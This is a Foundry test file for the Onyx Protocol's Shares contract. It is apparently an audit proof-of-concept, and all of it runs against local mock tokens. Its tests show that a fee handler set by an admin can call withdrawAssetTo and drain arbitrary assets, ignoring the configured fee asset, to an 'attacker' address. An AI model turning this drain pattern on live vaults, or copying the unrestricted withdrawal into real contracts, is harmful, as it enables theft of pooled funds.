// SPDX-License-Identifier: BUSL-1.1

/*
    This file is part of the Onyx Protocol.

    (c) Enzyme Foundation <foundation@enzyme.finance>

    For the full license information, please view the LICENSE
    file that was distributed with this source code.
*/

pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Shares} from "src/shares/Shares.sol";
import {ValuationHandler} from "src/components/value/ValuationHandler.sol";

import {MockERC20} from "test/mocks/MockERC20.sol";
import {FeeHandlerHarness} from "test/harnesses/FeeHandlerHarness.sol";

contract FeeHandlerArbitraryWithdrawTest is Test {
    Shares shares;
    address owner;
    address admin;
    ValuationHandler valuationHandler;

    function setUp() public {
        // Deploy core Shares
        shares = new Shares();
        owner = makeAddr("owner");
        shares.init({_owner: owner, _name: "Test Shares", _symbol: "TST", _valueAsset: keccak256("USD")});

        admin = makeAddr("admin");
        vm.prank(owner);
        shares.addAdmin(admin);

        // Deploy and set valuation handler (needed by FeeHandler.claimFees paths, though not used here)
        valuationHandler = new ValuationHandler();
        vm.prank(admin);
        shares.setValuationHandler(address(valuationHandler));
    }

    function test_feeHandler_canWithdrawArbitraryAsset_direct() public {
        // Setup tokens: feeAsset (legit) and victimAsset (arbitrary)
        MockERC20 feeAsset = new MockERC20(18);
        MockERC20 victimAsset = new MockERC20(18);

        uint256 victimSeed = 1_000e18;
        uint256 feeSeed = 500e18;
        victimAsset.mintTo(address(shares), victimSeed);
        feeAsset.mintTo(address(shares), feeSeed);

        // Deploy a fee handler (harness implements IComponentProxy for SHARES wiring) and set on Shares
        FeeHandlerHarness mal = new FeeHandlerHarness(address(shares));
        vm.prank(admin);
        shares.setFeeHandler(address(mal));

        // Victim user to receive drained assets
        address attacker = makeAddr("attacker");

        // Pre-assert balances
        assertEq(IERC20(address(victimAsset)).balanceOf(address(shares)), victimSeed);
        assertEq(IERC20(address(victimAsset)).balanceOf(attacker), 0);

        // Execute the exploit: malicious fee handler calls Shares.withdrawAssetTo for victimAsset
        uint256 drainAmount = 777e18;
        vm.prank(address(mal));
        shares.withdrawAssetTo({_asset: address(victimAsset), _to: attacker, _amount: drainAmount});

        // Post-assert balances: victim asset drained even though it's not the configured feeAsset
        assertEq(IERC20(address(victimAsset)).balanceOf(address(shares)), victimSeed - drainAmount);
        assertEq(IERC20(address(victimAsset)).balanceOf(attacker), drainAmount);
    }

    function test_feeAsset_config_doesNotRestrict_withdrawals() public {
        // Setup tokens
        MockERC20 feeAsset = new MockERC20(18);
        MockERC20 victimAsset = new MockERC20(18);

        // Seed balances to Shares
        uint256 victimSeed = 2_000e18;
        uint256 feeSeed = 1_000e18;
        victimAsset.mintTo(address(shares), victimSeed);
        feeAsset.mintTo(address(shares), feeSeed);

        // Deploy fee handler and set it
        FeeHandlerHarness mal = new FeeHandlerHarness(address(shares));
        vm.prank(admin);
        shares.setFeeHandler(address(mal));

        // Explicitly set feeAsset to feeAsset token
        vm.prank(admin);
        mal.setFeeAsset(address(feeAsset));

        // Attempt to withdraw the victimAsset anyway
        address receiver = makeAddr("receiver");
        uint256 amount = 1_111e18;

        vm.prank(address(mal));
        shares.withdrawAssetTo({_asset: address(victimAsset), _to: receiver, _amount: amount});

        // Assert drain succeeded despite feeAsset configuration
        assertEq(IERC20(address(victimAsset)).balanceOf(address(shares)), victimSeed - amount);
        assertEq(IERC20(address(victimAsset)).balanceOf(receiver), amount);
        // feeAsset untouched
        assertEq(IERC20(address(feeAsset)).balanceOf(address(shares)), feeSeed);
    }

    function testFuzz_feeHandler_withdrawArbitraryAsset(uint256 selector, uint256 amountSeed) public {
        // Create a small set of assets and seed balances
        MockERC20 assetA = new MockERC20(18);
        MockERC20 assetB = new MockERC20(6);
        MockERC20 assetC = new MockERC20(18);

        MockERC20[3] memory assets = [assetA, assetB, assetC];

        // Seed varying balances
        uint256 balA = 5_000e18;
        uint256 balB = 2_000e6; // 6 decimals
        uint256 balC = 123_456e18;
        assetA.mintTo(address(shares), balA);
        assetB.mintTo(address(shares), balB);
        assetC.mintTo(address(shares), balC);

        // Set up the fee handler
        FeeHandlerHarness mal = new FeeHandlerHarness(address(shares));
        vm.prank(admin);
        shares.setFeeHandler(address(mal));

        // Pick an asset via selector
        uint256 idx = selector % assets.length;
        MockERC20 target = assets[idx];

        // Bound amount to Shares balance
        uint256 sharesBal = IERC20(address(target)).balanceOf(address(shares));
        if (sharesBal == 0) return;
        uint256 amount = bound(amountSeed, 1, sharesBal);

        address receiver = makeAddr("fuzzReceiver");

        // Execute withdrawal from fee handler address
        vm.prank(address(mal));
        shares.withdrawAssetTo({_asset: address(target), _to: receiver, _amount: amount});

        // Assert
        assertEq(IERC20(address(target)).balanceOf(address(shares)), sharesBal - amount);
        assertEq(IERC20(address(target)).balanceOf(receiver), amount);
    }
}

